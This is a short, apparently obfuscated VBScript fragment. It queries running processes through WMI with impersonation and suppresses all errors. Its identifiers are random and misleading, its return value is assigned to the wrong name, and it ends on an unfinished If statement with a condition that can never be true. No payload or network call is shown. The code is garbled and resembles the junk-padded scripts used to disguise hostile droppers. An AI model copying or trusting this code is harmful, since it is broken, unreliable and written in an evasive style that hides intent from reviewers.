Function ReadBackupCipher32()
On Error Resume Next
  Dim blnExists25,strBackup884,strQueue52,blnReady64,strManifestRaw53
  blnExists25="."
  Set strBackup884=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & blnExists25 & "\root\cimv2")
  Set strQueue52=strBackup884.ExecQuery("Select DeviceID from Win32_Process")
  For Each blnReady64 In strQueue52
    strManifestRaw53=blnReady64.DeviceID
  Next
  If Err.Number<>0 Then
    Err.Clear
    FetchPolicyBlock68=1
    Exit Function
  End If
  FetchPolicyBlock68=0
End Function

If Len(WScript.FullName) > 9000 Then
